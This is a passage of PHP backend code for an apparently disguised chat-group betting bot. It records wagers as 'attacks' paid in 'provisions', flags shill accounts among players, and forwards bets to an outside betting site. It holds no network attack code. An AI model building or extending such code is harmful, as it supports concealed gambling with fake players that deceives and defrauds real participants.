            /*   $response['preDrawIssue'] = $response['drawNumber'];
            $response['drawIssue'] = $response['nextDrawNumber'];
            $response['drawTime'] = $response['nextDrawTime'];
            $response['preDrawCode'] = $response['number'];
            $arr = $response;
            */
            $arr = $response['result']['data'];
            break;
        default:
            $response = curl_get($u);
            $response = json_decode($response, true);
            $arr = $response['result']['data'];
            // $response = curl_get($u);
            // $response = json_decode($response,true);
            // $arr = $response['data'];
            // if ($response['status']==0&&isset($arr['next_issue'])) {
            //     $arr['preDrawIssue']=$arr['issue'];
            //     $arr['drawIssue']=$arr['next_issue'];
            //     $arr['drawTime']=$arr['next_time'];
            //     $arr['preDrawCode']=$arr['draw_code'];
            // } else {
            //     $arr = ['preDrawIssue'=>''];
            // }
            break;
    }
    return $arr;
}

function addDan($value, $admin, $last, $str, $qh, $danjia = 0, $isShow = 1)
{
    $id = db('record')->insertGetId([
        'BelongOperator' => $value['id'],
        'wxid' => 0,
        'NickName' => '机器人',
        'qihao' => $qh,
        'dtGenerate' => date("Y-m-d H:i:s"),
        'cmd' => '@' . $value['NickName'] . '  攻击成功，使用粮草' . trim($last) . ', 剩余粮草：' . (sprintf('%.2f', $value['score'] - $last)),
        //'cmd' => '@' . $value['NickName']. ', '. substr($qh,-3) . '回合攻击成功，1使用粮草' . trim($last) . ', 剩余粮草：' . (sprintf('%.2f', $value['score'] - $last)),
        'uid' => $admin['UserName'],
        'rid' => $value['uid'],
        'type' => 3,
        'text' => $str,
        'isTuo' => $value['isrobot'],
        'chi' => $value['chi'],
        'name' => $value['wxid'],
        'wid' => $value['NickName'],
        'score' => $last,
        'danjia' => $danjia,
        'fanshui' => $value['fans'],
        'peilv' => $value['peil'],
        'tePeilv' => $value['tepeil'],
        'teFanshui' => $value['tefans'],
        'isShow' => $isShow,
        'afterScore' => $value['score'] - $last,
        'zuoyu' => $value['score'],
        'gameType' => $value['gameType'],
        'qiuNum' => $value['qiuNum'],
        'istId' => isset($value['istId']) ? $value['istId'] : 0 
        //'istId' => $value['istId']
    ]);
    if ($value['isrobot'] == 0 && $value['chi'] == 0 && $value['gameType'] != 75) {
        // feidan($value,$str,$id);
    }
    // addLog($value,$str,$qh,$last);
    return $id;
}

function addDan2($value, $admin, $last, $str, $qh, $danjia = 0)
{
    $id = db('record')->insertGetId([
        'BelongOperator' => $value['id'],
        'wxid' => 0,
        'NickName' => '机器人',
        'qihao' => $qh,
        'dtGenerate' => date("Y-m-d H:i:s"),
        'cmd' => '@' . $value['NickName'] . '  攻击成功，使用粮草' . trim($last) . ', 剩余粮草：' . (sprintf('%.2f', $value['score'] - $last)),
       // 'cmd' => '@' . $value['NickName']. ', '. substr($qh,-3) . '回合攻击成功，2使用粮草' . trim($last) . ', 剩余粮草：' . (sprintf('%.2f', $value['score'] - $last)),
        'uid' => $admin['UserName'],
        'rid' => $value['uid'],
        'type' => 5,
        'text' => $str,
        'isTuo' => $value['isrobot'] == 1 ? 1 : 0,
        'chi' => $value['chi'] == 1 ? 1 : 0,
        'name' => $value['wxid'],
        'wid' => $value['NickName'],
        'score' => $last,
        'danjia' => $danjia,
        'fanshui' => $value['fans'],
        'peilv' => $value['peil'],
        'tePeilv' => $value['tepeil'],
        'teFanshui' => $value['tefans'],
        'afterScore' => $value['score'] - $last,
        'zuoyu' => $value['score'],
        'gameType' => $value['gameType'],
        'qiuNum' => $value['qiuNum'],
        'istId' => isset($value['istId']) ? $value['istId'] : 0
    ]);
    return $id;
}

function addDan3($value, $admin, $last, $str, $qh, $danjia = 0, $isShow)
{
    $id = db('record')->insertGetId([
        'BelongOperator' => $value['id'],
        'wxid' => 0,
        'NickName' => '机器人',
        'qihao' => $qh,
        'dtGenerate' => date("Y-m-d H:i:s"),
        'cmd' => '@' . $value['NickName'] . '  攻击成功，使用粮草' . trim($last) . ', 剩余粮草：' . (sprintf('%.2f', $value['score'] - $last)),
        //'cmd' => '@' . $value['NickName']. ', '. substr($qh,-3) . '回合攻击成功，3使用粮草' . trim($last) . ', 剩余粮草：' . (sprintf('%.2f', $value['score'] - $last)),
        'uid' => $admin['UserName'],
        'rid' => $value['uid'],
        'type' => 3,
        'text' => $str,
        'isTuo' => $value['isrobot'] == 1 ? 1 : 0,
        'chi' => $value['chi'] == 1 ? 1 : 0,
        'name' => $value['wxid'],
        'wid' => $value['NickName'],
        'score' => $last,
        'danjia' => $danjia,
        'fanshui' => $value['fans'],
        'peilv' => $value['peil'],
        'tePeilv' => $value['tepeil'],
        'teFanshui' => $value['tefans'],
        'isShow' => $isShow,
        'afterScore' => $value['score'] - $last,
        'zuoyu' => $value['score'],
        'gameType' => $value['gameType'],
        'qiuNum' => $value['qiuNum'],
        'istId' => isset($value['istId']) ? $value['istId'] : 0
    ]);
    if ($value['isrobot'] == 0 && $value['chi'] == 0 && $value['gameType'] != 75 && $value['gameType'] != 5) {
        $id = feidan($value, $str, $id, []);
    }
    // addLog($value,$str,$qh,$last);
    return $id;
}

function addDan4($value, $admin, $last, $str, $qh, $danjia = 0, $isShow, $ma)
{
    $id = db('record')->insertGetId([
        'BelongOperator' => $value['id'],
        'wxid' => 0,
        'NickName' => '机器人',
        'qihao' => $qh,
        'dtGenerate' => date("Y-m-d H:i:s"),
        'cmd' => '@' . $value['NickName'] . '  攻击成功，使用粮草' . trim($last) . ', 剩余粮草：' . (sprintf('%.2f', $value['score'] - $last)),
        //'cmd' => '@' . $value['NickName']. ', '. substr($qh,-3) . '回合攻击成功，4使用粮草' . trim($last) . ', 剩余粮草：' . (sprintf('%.2f', $value['score'] - $last)),
        'uid' => $admin['UserName'],
        'rid' => $value['uid'],
        'type' => 3,
        'text' => $str,
        'isTuo' => $value['isrobot'] == 1 ? 1 : 0,
        'chi' => $value['chi'] == 1 ? 1 : 0,
        'name' => $value['wxid'],
        'wid' => $value['NickName'],
        'score' => $last,
        'danjia' => $danjia,
        'fanshui' => $value['fans'],
        'peilv' => $value['peil'],
        'tePeilv' => $value['tepeil'],
        'teFanshui' => $value['tefans'],
        'isShow' => $isShow,
        'afterScore' => $value['score'] - $last,
        'zuoyu' => $value['score'],
        'gameType' => $value['gid'],
        'qiuNum' => $value['qiuNum'],
        'wf' => $ma,
        'istId' => isset($value['istId']) ? $value['istId'] : 0
    ]);
    if ($value['isrobot'] == 0 && $value['chi'] == 0 && $value['gid'] != 75 && $value['gid'] != 5) {
        feidan($value, $str, $id, []);
    }
    return $id;
}

function addLog($value, $str, $qh, $last)
{
    // if ($value['isrobot']==0) {
    $userIp = request()->ip();
    $now = date("Y-m-d H:i:s");
    $log = [
        'user_id' => $value,
        'ip' => $userIp,
        'loginTime' => $now,
        'username' => $str,
        'qh' => $qh,
        'jine' => $last
    ];
    LoginLon::log($log);
    // }
}

function checkUser($w, $tar, $frist)
{
    $msg = '链接无效！';
    $code = false;
    $user = db('rbuser')->where('code', $w)->find();
    $rb = db('robot')->where('UserName', $user['uid'])->find();
    if ($rb) {
        if (strtotime($rb['time']) < time()) {
            $msg = '已过期！';
      //  } elseif ($rb['isOpen'] == 0) {
        } elseif ($rb['isOpen'] == 0&&1==2) {
            $msg = '已封盘！';
        } else {
            if ($user && $user['isBlack'] == 0) {
                if ((!$user['token'] || ($user['token'] !== session('user_token'))) && !$frist) {
                    $msg = '网络异常请重新刷新页面！';
                } elseif ((($user['online'] == 0) && !$frist) || ((time() - $user['logtime'] > 30 * 60) && $tar == 1)) {
                    $msg = '';
                    db('rbuser')->where('id', $user['id'])->update(['online' => 0]);
                } else {
                    $code = true;
                    $rb['type'] = $user['gid'];
                    session('user_id3', $rb['UserName']);
                    session('user_find', $user);
                    session('robot_find', $rb);
                    session('user_token', $user['token']);
                    session('user_cd', $user['code']);
                    db('rbuser')->where('id', $user['id'])->update(['online' => 1]);
                }
                if ($tar == 0) {
                    db('rbuser')->where('id', $user['id'])->update(['logtime' => time()]);
                }
            }
        }
    }
    $user['numStrArr'] = explode(',', $user['numStr']);
    return ['code' => $code, 'msg' => $msg, 'user' => $user, 'rb' => $rb];
}

function getDaoji()
{
    $rb = session('robot_find');
    $kj = cache('nowQi' . $rb['type']);
    $qh = $kj['QiHao'];
    $last = cache('lastQi' . $rb['type']);
    // if (0 < (strtotime($kj['dtOpen'])-time()) && (strtotime($kj['dtOpen'])-time()) <= 300) {
    if ($rb['type'] == 75) {
        if ((strtotime($kj['dtOpen']) - time()) < $rb['fengpan']) {
            $kj['dtOpen'] = 0;
        } else {
            $kj['dtOpen'] = strtotime($kj['dtOpen']) - time() - 63;
        }
    } else {
        $kj['dtOpen'] = strtotime($kj['dtOpen']) - time() - $rb['fengpan'] + 5;
    }
    // } else {
    //     $kj['dtOpen'] = 0;
    // }
    $kj['QiHao'] = $last['QiHao'];
    $kj['Code'] = $last['Code'];
    return ['kj' => $kj, 'qh' => $qh, 'rb' => $rb];
}


function getLishi($data, $rb = '')
{
    $type = $data['gameType'];
    $js = (int)cache('ls' . $type);
    $hisArr = db('history')->where('type', $type)->where('Code', '<>', '')->order('id desc')->limit($js)->select();
    $arr = cache('nowQi' . $type);
    if (isset($data['cmdqiu'])) {
        $fan = getFan($hisArr[0], $data);
    } else {
        $fan = getFan($hisArr[0]);
    }
    // 初始化历史字符串
    if ($data['iskj']) {
        $hisStr = '@' . $data['NickName'] . '<br>' . $hisArr[0]['QiHao'] . '期结果' . '<br>(' . $hisArr[0]['Code'] . ')' . ($type == 75 ? '' : '开' . $fan . '番') . '-><br>';
    } else {
        $hisStr = '历史参考:<br>';
    }

    // 反转数组
    $hisArr = array_reverse($hisArr);
    $lenHis = round(count($hisArr) / 12);
    $config = cache('rbConfig');

    // 遍历历史数据
    for ($i = 0; $i < ($lenHis + 1); $i++) {
        for ($y = ($i * 12); $y < count($hisArr); $y++) {
            if ($y < ($i + 1) * 12) {
                // 判断是否有 $data['cmdqiu']，并传递给 getFan 函数
                if (isset($data['cmdqiu'])) {
                    $fan = getFan($hisArr[$y], $data);
                } else {
                    $fan = getFan($hisArr[$y]);
                }

                $hisStr .= '<span class="ck">' . $fan . '</span>' . ($y == (count($hisArr) - 1) ? '<br>' : ($y !== (($i + 1) * 12 - 1) ? '-' : '<br>'));
            }
        }
    }

    // 添加结束信息
    if (!$data['iskj']) {
        $hisStr .= '
----------------------<br>' . ($arr['QiHao']) . '期开始<br>
<span style="color:red;">' . $config['errMsg'] . '</span>';
    }

    return $hisStr;
}


function getZoushi()
{
    $zs = db('history')->where('Code', '<>', '')->where('type', 75)->order('id desc')->limit(20)->select();
    $zs = array_reverse($zs);
    $hisStr = '<table border="1"><thead><tr class="background_1"><th scope="col">期</th><th scope="col">时间</th><th colspan="2" scope="col">平一</th><th colspan="2" scope="col">平二</th><th colspan="2" scope="col">平三</th><th colspan="2" scope="col">平四</th><th colspan="2" scope="col">特码</th><th colspan="2" scope="col">和值</th><th scope="col">龙</th></tr></thead><tbody class="xsl_lst">';
    foreach ($zs as $k => $value) {
        list($da1, $dan1, $da2, $dan2, $da3, $dan3, $da4, $dan4, $da5, $dan5, $da, $dan, $lh) = wfResult($value);
        $hisStr .= '<tr class="xsl_lst"><td>' . substr($value['QiHao'], -3) . '</td>' . '<td>' . substr($value['dtOpen'], -5) . '</td><td class="' . ($da1 == '大' ? 'color_red' : '') . '">' . $da1 . '</td><td class="' . ($dan1 == '双' ? 'color_red' : '') . '">' . $dan1 . '</td><td class="' . ($da2 == '大' ? 'color_red' : '') . '">' . $da2 . '</td><td class="' . ($dan2 == '双' ? 'color_red' : '') . '">' . $dan2 . '</td><td class="' . ($da3 == '大' ? 'color_red' : '') . '">' . $da3 . '</td><td class="' . ($dan3 == '双' ? 'color_red' : '') . '">' . $dan3 . '</td><td class="' . ($da4 == '大' ? 'color_red' : '') . '">' . $da4 . '</td><td class="' . ($dan4 == '双' ? 'color_red' : '') . '">' . $dan4 . '</td><td class="' . ($da5 == '大' ? 'color_red' : '') . '">' . $da5 . '</td><td class="' . ($dan5 == '双' ? 'color_red' : '') . '">' . $dan5 . '</td><td class="' . ($da == '大' ? 'color_red' : '') . '">' . $da . '</td><td class="' . ($dan == '双' ? 'color_red' : '') . '">' . $dan . '</td><td class="' . ($lh == '龙' ? 'color_red' : '') . '">' . $lh . '</td></tr>';
    }
    $hisStr .= '</tbody></table>';
    return $hisStr;
}

function feidan($value, $str, $id, $xiaList)
{
    $user = db('robot')->where('UserName', $value['uid'])->find();
    $zi = db('admin')->where('UserName', $user['uid'])->find();
    $user['gameType'] = $value['gameType'];
    $order_makes = array(
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0
    );
    //record的dtGenerate时间减去系统时间大于cancel才可以飞单
    $record = db("record")->where('id', $id)->find();
    if ($record['type'] == 3 && time() - strtotime($record['dtGenerate']) < ($user['cancel'] + 5)) {
        // echo "未超过取消时间，跳出".PHP_EOL;
        db("record")->where('id', $id)->update(array(
            "flyers_status" => 3
        ));
        return 3;
    }
    if ($zi['feidan'] == 1 && $zi['feidanonline'] == 1) {
        $type = '特';
        $money = 0;
        $info = Db::name('rbwp')->where('id', $zi['feidanid'])->find();
        $flyers = new K28(array(
            'host' => $info['websiteUrl']
        ));
        $daxiao = ['单', '双', '13', '24', '42', '31', '大', '小'];
        $frist = mb_substr($str, 0, 1, "UTF-8");
        $last = mb_substr($str, 1, strlen($str), "UTF-8");
        $arr = explode('/', $str);
        $cmds = $flyers->getCmd($str);
        foreach ($cmds as $v) {
            if (strstr($v['cmd'], '特')) {
                if (strstr(explode('特', $v['cmd'])[0], '-')) {
                    $t = explode('-', explode('特', $v['cmd'])[0]);
                    foreach ($t as $i) {
                        $order_makes[$i - 1] = bcadd($order_makes[$i - 1], $v['money'], 2);
                    }
                } else {
                    $t = explode('/', explode('特', $v['cmd'])[0]);
                    foreach ($t as $i) {
                        $order_makes[$i - 1] = bcadd($order_makes[$i - 1], $v['money'], 2);
                    }
                }
            } else {
                if (in_array($frist, $daxiao) || in_array($arr[0], $daxiao)) {
                    if ($frist == '大' || $frist == '小') {
                        $type = $frist;
                        $money = $last;
                    } else {
                        if ($frist == '单' || $arr[0] == '13' || $arr[0] == '31') {
                            $money = ($frist == '单' ? $last : $arr[1]);
                            $type = '单';
                        } else {
                            $money = ($frist == '双' ? $last : $arr[1]);
                            $type = '双';
                        }
                    }
                } else {
                    $v = $flyers->cmdConvert($v);
                    foreach ($v as $vi) {
                        if (strstr(explode('特', $vi['cmd'])[0], '-')) {
                            $t = explode('-', explode('特', $vi['cmd'])[0]);
                            foreach ($t as $ti) {
                                $order_makes[$ti - 1] = bcadd($order_makes[$ti - 1], $vi['money'], 2);
                            }
                        } else {
                            $t = explode('/', explode('特', $vi['cmd'])[0]);
                            foreach ($t as $ti) {
                                $order_makes[$ti - 1] = bcadd($order_makes[$ti - 1], $vi['money'], 2);
                            }
                        }
                    }
                }
            }
        }
        $order = db('record')->where('id', $id)->find();
        $make = $flyers->subMake($order_makes, $user, $type, $money, $zi, $order);
        if ($make == 3) {
            // if ($zi['flyers_withdraw']==1) {
            //     $user = db('rbuser')->where('wxid',$order['name'])->where('uid',$order['rid'])->find();
            //     $user['gameType'] = $user['gid'];
            //     $user['qiuNum'] = $order['qiuNum'];
            //     $user['iskj'] = true;
            //     $admin = db('admin')->where('UserName',$order['uid'])->find();
            //     db('rbuser')->where('wxid',$order['name'])->where('uid',$order['rid'])->setInc('score',$order['score']);
            //     addMsg($user,$admin,'@'.$user['NickName'].' "'.$order['text'].'" 注单取消',$order['qihao']);
            //     db('record')->where('id',$id)->delete();
            // } else {
            db("record")->where('id', $id)->update(array(
                "flyers_status" => $make
            ));
            // }
        } else {
            db("record")->where('id', $id)->update(array(
                "flyers_status" => $make
            ));
        }
        return $make == 2 ? $make : $id;
    } else {
        if ($user['flyers_online'] == 1 && $user['flyers_auto'] == 1) {
            $fly = db('rbfly')->where('uid', $value['uid'])->where('flyers_online', 1)->find();
            $type = '特';
            $money = 0;
            if ($fly) {
                $wp = Db::name('rbwp')->where('id', $fly['fly_id'])->find();
                $flyers = new K28(array(
                    'host' => $wp['websiteUrl']
                ));
                // $cmds = $flyers->getCmd($str);
                // $orderData = [];
                // // $d = cache('k28json');
                // $json_path = ROOT_PATH . "flyers/json/K28.json";
                // $d = json_decode(file_get_contents($json_path),true);
                // foreach ($cmds as $v){
                //     if (strstr($v['cmd'],'/')) {
                //         $arr4 = explode('/',$v['cmd']);
                //         foreach ($arr4 as $val) {
                //             foreach ($d['番摊'] as $item){
                //                 if ($item['name'] == $val){
                //                     $item['orderMoney'] = $v['money'];
                //                     array_push($orderData,$item);
                //                 }
                //             }
                //         }
                //     } elseif (strstr($v['cmd'],'-')) {
                //         $arr4 = explode('-',$v['cmd']);
                //         foreach ($arr4 as $val) {
                //             foreach ($d['番摊'] as $item){
                //                 if ($item['name'] == $val){
                //                     $item['orderMoney'] = $v['money'];
                //                     array_push($orderData,$item);
                //                 }
                //             }
                //         }
                //     } else {
                //         foreach ($d['番摊'] as $item){
                //             if ($item['name'] == $v['cmd']){
                //                 $item['orderMoney'] = $v['money'];
                //                 array_push($orderData,$item);
                //             }
                //         }
                //     }
                // }
                $daxiao = ['单', '双', '13', '24', '42', '31', '大', '小'];
                $frist = mb_substr($str, 0, 1, "UTF-8");
                $last = mb_substr($str, 1, strlen($str), "UTF-8");
                $arr = explode('/', $str);
                $cmds = $flyers->getCmd($str);
                foreach ($cmds as $v) {
                    if (strstr($v['cmd'], '特')) {
                        if (strstr(explode('特', $v['cmd'])[0], '-')) {
                            $t = explode('-', explode('特', $v['cmd'])[0]);
                            foreach ($t as $i) {
                                $order_makes[$i - 1] = bcadd($order_makes[$i - 1], $v['money'], 2);
                            }
                        } else {
                            $t = explode('/', explode('特', $v['cmd'])[0]);
                            foreach ($t as $i) {
                                $order_makes[$i - 1] = bcadd($order_makes[$i - 1], $v['money'], 2);
                            }
                        }
                    } else {
                        if (in_array($frist, $daxiao) || in_array($arr[0], $daxiao)) {
                            if ($frist == '大' || $frist == '小') {
                                $type = $frist;
                                $money = $last;
                            } else {
                                if ($frist == '单' || $arr[0] == '13' || $arr[0] == '31') {
                                    $money = ($frist == '单' ? $last : $arr[1]);
                                    $type = '单';
                                } else {
                                    $money = ($frist == '双' ? $last : $arr[1]);
                                    $type = '双';
                                }
                            }
                        } else {
                            $v = $flyers->cmdConvert($v);
                            foreach ($v as $vi) {
                                if (strstr(explode('特', $vi['cmd'])[0], '-')) {
                                    $t = explode('-', explode('特', $vi['cmd'])[0]);
                                    foreach ($t as $ti) {
                                        $order_makes[$ti - 1] = bcadd($order_makes[$ti - 1], $vi['money'], 2);
                                    }
                                } else {
                                    $t = explode('/', explode('特', $vi['cmd'])[0]);
                                    foreach ($t as $ti) {
                                        $order_makes[$ti - 1] = bcadd($order_makes[$ti - 1], $vi['money'], 2);
                                    }
                                }
                            }
                        }
                    }
                }
                $order = db('record')->where('id', $id)->find();
                $make = $flyers->make($order_makes, $user, $type, $money, $user, $wp, $order, $xiaList);
                if ($make == 3) {
                    // if ($user['flyers_withdraw']==1) {
                    //     $user = db('rbuser')->where('wxid',$order['name'])->where('uid',$order['rid'])->find();
                    //     $user['gameType'] = $user['gid'];
                    //     $user['qiuNum'] = $order['qiuNum'];
                    //     $user['iskj'] = true;
                    //     $admin = db('admin')->where('UserName',$order['uid'])->find();
                    //     db('rbuser')->where('wxid',$order['name'])->where('uid',$order['rid'])->setInc('score',$order['score']);
                    //     addMsg($user,$admin,'@'.$user['NickName'].' "'.$order['text'].'" 注单取消',$order['qihao']);
                    //     db('record')->where('id',$id)->delete();
                    // } else {
                    db("record")->where('id', $id)->update(array(
                        "flyers_status" => $make
                    ));
                    // }
                } else {
                    db("record")->where('id', $id)->update(array(
                        "flyers_status" => $make
                    ));
                }
                return $make == 2 ? $make : $id;
            }
        }
    }
}

function setCount($name)
{
    $count1 = db('rbuser')->where('uid', $name)->where('isrobot', 0)->count();
    session('rbuserCount' . $name, $count1);
    $count2 = db('rbuser')->where('uid', $name)->where('isrobot', 1)->count();
    session('rbusertuoCount' . $name, $count2);
    return [$count1, $count2];
}

function addMsg3($value, $admin, $last, $str, $qh, $sys, $oid = '', $show = 1)
{
    $id = db('record')->insertGetId([
        'BelongOperator' => $value['id'],
        'wxid' => 0,
        'NickName' => '机器人',
        'qihao' => $qh,
        'dtGenerate' => date("Y-m-d H:i:s"),
        'cmd' => $str,
        'uid' => $admin['UserName'],
        'type' => 4,
        'text' => $str,
        'isTuo' => $value['isrobot'] == 1 ? 1 : 0,
        'name' => $value['wxid'],
        'rid' => $value['uid'],
        'wid' => $value['NickName'],
        'score' => $last,
        'sys' => $sys,
        'oid' => $oid,
        'isShow' => $show,
        'gameType' => $value['gameType'],
        'zuoyu' => $value['score'],
        'afterScore' => ($sys == 0 ? ($value['score'] + $last) : ($value['score'] - $last))
    ]);
    return $id;
}

function addMsg($value, $admin, $str, $qh)
{
    $id = db('record')->insertGetId([
        'BelongOperator' => $value['id'],
        'wxid' => 0,
        'NickName' => '机器人',
        'qihao' => $qh,
        'dtGenerate' => date("Y-m-d H:i:s"),
        'cmd' => $str,
        'uid' => $admin['UserName'],
        'wid' => $value['NickName'],
        'gameType' => $value['gameType'],
        'rid' => $value['uid']
    ]);
    return $id;
}

function addMsg2($value, $admin, $str, $qh, $text, $wxid, $kaijiang = 0)
{
    $id = db('record')->insertGetId([
        'BelongOperator' => $value['id'],
        'wxid' => $wxid,
        'NickName' => '机器人',
        'qihao' => $qh,
        'dtGenerate' => date("Y-m-d H:i:s"),
        'cmd' => $str,
        'uid' => $admin['UserName'],
        'rid' => $value['uid'],
        'gameType' => $value['gameType'],
        'sys' => $text,
        'kaijiang' => $kaijiang
    ]);
    return $id;
}

function addCmd($value, $admin, $str, $qh)
{
    $id = db('record')->insertGetId([
        'BelongOperator' => $value['id'],
        'wxid' => $value['wxid'],
        'NickName' => $value['NickName'],
        'qihao' => $qh,
        'dtGenerate' => date("Y-m-d H:i:s"),
        'cmd' => $str,
        'headimg' => $value['imgName'],
        'uid' => $admin['UserName'],
        'name' => $value['wxid'],
        'rid' => $value['uid'],
        'gameType' => $value['gameType']
    ]);
    return $id;
}

function delCmd($id)
{
    db('record')->where('id', $id)->delete();
}

function addJifen($value, $admin, $last, $type, $qh = '', $isjian = 0)
{
    if ($type == 1 && $isjian == 0) {
        db('rbuser')->where('wxid', $value['wxid'])->where('uid', $value['uid'])->setDec('score', $last);
    }
    $oid = db('folder')->insertGetId([
        'wxid' => $value['wxid'],
        'nickName' => $value['NickName'],
        'score' => $last,
        'time' => date("Y-m-d H:i:s"),
        'isTuo' => ($value['isrobot'] == '1' ? 1 : 0),
        'type' => $type,
        'uid' => $admin['UserName'],
        'rid' => $value['uid'],
        'qh' => $qh,
        'gameType' => $value['gameType']
    ]);
    return $oid;
}

function cha($value, $admin, $str, $qh)
{
    addCmd($value, $admin, $str, $qh);
    $istId = addMsg($value, $admin, '@' . $value['NickName'] . '  剩余：' . sprintf('%.1f', $value['score']), $qh);
    return $istId;
}

function lishi($value, $admin, $str, $qh, $usre)
{
    if ($value['gameType'] != 75) {
        addCmd($value, $admin, $str, $qh);
        $hisStr = getLishi($value);
        $istId = addMsg2($value, $admin, $hisStr, $qh, 'ck', 1);
        return $istId;
    } else {
        return 0;
    }
}

function zoushi($value, $admin, $str, $qh)
{
    if ($value['gameType'] == 75) {
        addCmd($value, $admin, $str, $qh);
        $hisStr = getZoushi();
        $istId = addMsg2($value, $admin, $hisStr, $qh, 'ck', 1);
        return $istId;
    } else {
        return 0;
    }
}

function getQiuWf($type, $qiuNum)
{
    $game = db('rbgame')->where('gameType', $type)->where('status', 1)->find();
    $qiu = ($game['hasSelect'] ? '第' . $qiuNum . '球/' : ($game['wf'] ? $game['wf'] . '/' : ''));
    return $qiu;
}

function liushui($value, $admin, $str, $qh, $usre)
{
    addCmd($value, $admin, $str, $qh);
    $lius = get_Liushui($value, $usre);
    $istId = addMsg($value, $admin, $lius, $qh);
    return $istId;
}

function hasSys($type, $endQh, $sys, $uname = '')
{
    if ($uname) {
        $sys = db('record')->where('gameType', $type)->where('rid', $uname)->where('qihao', $endQh)->where('sys', $sys)->find();
    } else {
        $sys = db('record')->where('gameType', $type)->where('qihao', $endQh)->where('sys', $sys)->find();
    }
    return $sys ? true : false;
}

function codeArr($kj)
{
    return explode(',', $kj['Code']);
}

function wfResult($kj)
{
    $da1 = getQiuDx($kj, 1, false);
    $dan1 = getQiuDs($kj, 1, false);
    $da2 = getQiuDx($kj, 2, false);
    $dan2 = getQiuDs($kj, 2, false);
    $da3 = getQiuDx($kj, 3, false);
    $dan3 = getQiuDs($kj, 3, false);
    $da4 = getQiuDx($kj, 4, false);
    $dan4 = getQiuDs($kj, 4, false);
    $da5 = getQiuDx($kj, 5, false);
    $dan5 = getQiuDs($kj, 5, false);
    $da = getZongDx($kj);
    $dan = getZongDs($kj);
    $lh = getLongHu($kj);
    return [$da1, $dan1, $da2, $dan2, $da3, $dan3, $da4, $dan4, $da5, $dan5, $da, $dan, $lh];
}

function bgKj($kj)
{
    list($da1, $dan1, $da2, $dan2, $da3, $dan3, $da4, $dan4, $da5, $dan5, $da, $dan, $lh) = wfResult($kj);
    $kai = '<table border="1"><thead><tr class="background_1"><th colspan="2" scope="col">平一</th><th colspan="2" scope="col">平二</th><th colspan="2" scope="col">平三</th><th colspan="2" scope="col">平四</th><th colspan="2" scope="col">特码</th></tr></thead><tbody class="xsl_lst"><tr class="xsl_lst"><td class="' . ($da1 == '大' ? 'color_red' : '') . '">' . $da1 . '</td><td class="' . ($dan1 == '双' ? 'color_red' : '') . '">' . $dan1 . '</td><td class="' . ($da2 == '大' ? 'color_red' : '') . '">' . $da2 . '</td><td class="' . ($dan2 == '双' ? 'color_red' : '') . '">' . $dan2 . '</td><td class="' . ($da3 == '大' ? 'color_red' : '') . '">' . $da3 . '</td><td class="' . ($dan3 == '双' ? 'color_red' : '') . '">' . $dan3 . '</td><td class="' . ($da4 == '大' ? 'color_red' : '') . '">' . $da4 . '</td><td class="' . ($dan4 == '双' ? 'color_red' : '') . '">' . $dan4 . '</td><td class="' . ($da5 == '大' ? 'color_red' : '') . '">' . $da5 . '</td><td class="' . ($dan5 == '双' ? 'color_red' : '') . '">' . $dan5 . '</td></tr></tbody></table>';
    return $kai;
}

function qiuHong($value, $game, $k)
{
    $hong = '';
    $jstype = $game['jsType'];
    $jsArr = explode(',', $jstype);
    if ($game['gameType'] == 75) {
        $hong = ($value % 3 == 0 ? 'red75' : ($value % 3 == 1 ? 'blue75' : 'green75'));
    } else {
        if ($game['gameType'] == 17) {
            $hong = 'hong';
        } else {
            if (in_array($k + 1, $jsArr) && $jstype) {
                $hong = 'hong';
            }
        }
    }
    return $hong;
}

function sendMsg($data)
{
    $wan = db('rbuser')->where('wxid', $data['wxid'])->find();
    $usre = db('robot')->where('UserName', $wan['uid'])->find();
    $admin = db('admin')->where('UserName', $usre['uid'])->find();
    $open = cache('nowQi' . $wan['gid']);
    $istId = 0;
    $wan['gameType'] = $wan['gid'];
    $wan['qiuNum'] = $data['qiuIndex'];
    $wan['iskj'] = true;
    if ($wan['isBlack'] == 0 && $wan && $admin && $usre && $data['qh'] == $open['QiHao']) {
        $wan['fans'] = $usre['FanShui'];
        $wan['peil'] = $usre['PeiLv'];
        $wan['tepeil'] = $usre['tePeilv'];
        $wan['tefans'] = $usre['teFanshui'];
        $str = $data['cmd'];
        $huan = explode("\n", $str);
        $kong = explode(",", $str);
        $str = preg_replace('/[-.=+]/', '/', $str);
        preg_match('/第(\d+)球/', $str, $matches);
        var_dump($matches);
        if (!empty($matches[1])) {
            $wan['cmdqiu'] = $matches[1];  // 提取的数字
        }
        if ((in_array($wan['gid'],array(17))) && strstr($str, '/') && count($huan) == 1 && count($kong) == 1) {
           $str = preg_replace('/^[^\/]+\//', '', $str); 
           //echo $str . PHP_EOL;
        }
     //   var_dump($huan);
        $frist = mb_substr($str, 0, 1, "UTF-8");
        $last = mb_substr($str, 1, strlen($str), "UTF-8");
        $arr = explode('/', $str);
        if (strstr($last, '/')) {
            $last = ltrim($last, '/');
        }
      //  echo 'frist->' . $frist . ' last->' . $last . PHP_EOL;
        if (trim($str) == '查') {
            $istId = cha($wan, $admin, $str, $data['qh']);
        } elseif (trim($str) == '玩法') {
            addCmd($wan, $admin, $str, $data['qh']);
            $istId = addMsg2($wan, $admin, '/static/xz/vs.zz.zhuguangbq.xyz_files/wanfa.jpg', $data['qh'], 'wf', 0);
        } elseif (trim($str) == '历史') {
            $istId = lishi($wan, $admin, $str, $data['qh'], $usre);
        } elseif (trim($str) == '走势') {
            $istId = zoushi($wan, $admin, $str, $data['qh']);
        } elseif (trim($str) == '流水') {
            $istId = liushui($wan, $admin, $str, $data['qh'], $usre);
        } elseif (trim($str) == '取消') {
            addCmd($wan, $admin, $str, $data['qh']);
            if ((strtotime($open['dtOpen']) - time()) < $usre['fengpan']) {
                if ($open['QiHao'] == $data['qh']) {
                    $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 本期已停止，禁止取消!', $data['qh']);
                }
            } elseif ($usre['cancel'] == 0) {
                if ($open['QiHao'] == $data['qh']) {
                    $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 禁止取消!', $data['qh']);
                }
            } else {
                $order = db('record')->where('gameType', $wan['gid'])->where('name', $data['wxid'])->where('rid', $wan['uid'])->where('qihao', $data['qh'])->where('type', 3)->select();
                if (count($order) > 0) {
                    $hasOrder = false;
                    $m = 0;
                    $allStr = '@' . $data['dluser'] . '
';
                    foreach ($order as $val) {
                        if ($val['type'] == 3) {
                            if (time() - strtotime($val['dtGenerate']) < $usre['cancel']) {
